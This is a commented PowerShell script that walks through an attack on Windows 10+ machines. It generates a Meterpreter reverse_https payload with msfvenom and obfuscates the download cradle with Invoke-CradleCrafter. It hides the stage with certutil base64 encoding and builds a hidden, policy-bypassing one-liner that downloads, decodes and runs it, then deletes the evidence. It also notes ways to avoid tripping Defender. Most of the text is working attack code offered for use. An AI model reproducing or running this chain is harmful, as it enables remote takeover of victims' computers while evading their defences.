<# PowerShell: In-Memory Injection Using CertUtil.exe

Setup Requirements: 
Metasploit
Invoke-CradleCrafter
PowerShell
Windows 10+ 

If you use powershell for linux, you can avoid 
tripping defender from invoke-cradlecrafter

I also use WSL in this script for interoperability between Win & Kali

#>

# Generate Payload
& "$env:windir\system32\wsl.exe" msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt
# After this place your generated payload in a web content server folder
# Importing Cradle Crafter, at the prompt set your IP which was set in the msfvenom payload
ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://127.0.0.1/load.txt' -Command 'Memory\*\All\1,OUT C:\raw.txt' -Quiet
##################################
# ALERNATIVE
#ipmo .\Invoke-CradleCrafter.psd1  ; Invoke-CradleCrafter
# SET URL http://x.x.x.x/load.txt
# MEMORY
# CERTUTIL
# ALL
# 1
##################################
# Once you have your payload, paste it into the below
#$Load_of_Pay = Read-Host -Prompt 'Paste payload here'
#ni -Path C:\raw.txt
#echo $Load_of_Pay > C:\raw.txt
##################################

<#._
          You will encode this file in base64 using the certutil to create a file called cert.cer and place it on a webserver.
           We will then construct a one-liner that will be called remotely to pull down this file and get it executed on the target. Once it executes it will call our payload load.txt and inject Meterpreter via PowerShell into memory. 
#>
certiutil -encode C:\raw.txt C:\cert.cer
# Place your cert.cer in your payload directory where the server is hosted
# I'm going to comment an example of me doing this in wsl from windows
<#
PS C:\> wsl cp /mnt/c/cert.cer /home/kali/payloads
#>

# One-liner:
powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://127.0.0.1/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 | start /b cmd /c del %APPDATA%\cert.cer
# Once you have everything set up and your web server started where the content is served. 
# You can run the above command and you should get a Meterpreter shell.
# Your web server should get 2 hits.
#Note that for this attack to be successful, the Meterpreter PowerShell script that gets executed needs to be deleted manually. 
#The cert.cer file will automatically get deleted, but you will need to delete stage.ps1 file once in a Meterpreter session by doing:
<#
PS C:\> rm %APPDATA%\\stage.ps1
#>
#Also note that you can also just drop to PowerShell from a command shell you may have gotten by other means and copy in the contents of your stage.ps1 file to get your payload executed directly like so:
# <obfusgated powershell command or dosfusgated cmd command>
<#
# SIG #
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJjD9E4AAoJEF8dVLesaXg9Fj4P/1mJh3Sd7SekKB7g+JSSnjAW
uuGQXhCKZbqEhAF3HSppWrZBINU3JvccG6E1l75u1cPPaGIhZ3HiNUeFg5QORCB7
onRbmfjzjzloBRjA/m8KD/HuFoEdU2Agdh3kI34FG2mQpYKvpiKW+mGXokB3nJaM
sqJEzgKVM5NNJQ58G9A7yKUsQ3JYg9Dd3h0BjYgvJ3L5OPDCHYOR9JzQjkYbqjop
WRQbHhYJwxnJzMfDFVC+4cbupXBiEU0w45te7lmv6a6dq3fd4Uj1dQw17lI5aGO4
3Xiq38QZmXLXt6owU3keamL7IFEeBNWy0DLaW3ermZSGefsoTTP4whbwGqx5Qp5f
QZJXeLIAjQMbVNUgJYv4scf3b1oBEBID0HRhDyFd9Jjd/oTuqizTW4jmI13seaVg
Rssj/NOrIDMAaroKMWqE4bQ01RpGi5Ripxo7Ng3x/jz6G1XiFUrR52yJF1F0Yc8A
Z2bpaLKAc8TOBx6O5b1zPckn+ZrnTKYCmRqLiQurZ8U9RDcUOPm+7G2qrBhrMYkT
V9uFYr5dwQ2OFV6YZjgKK5BO2ko/Jb7Up+zsANYhbuzb/JOrlfJT+FKcm/8c7fKO
TB+njZ86a0vayOhiodOZK2+0SNWhY7lsb5/Sg5TRbKILn8t3AwDFVmM9lIbMyRc/
Rx8tZek/qzWAghbyUc/a
=Ae+7
-----END PGP SIGNATURE-----

#>
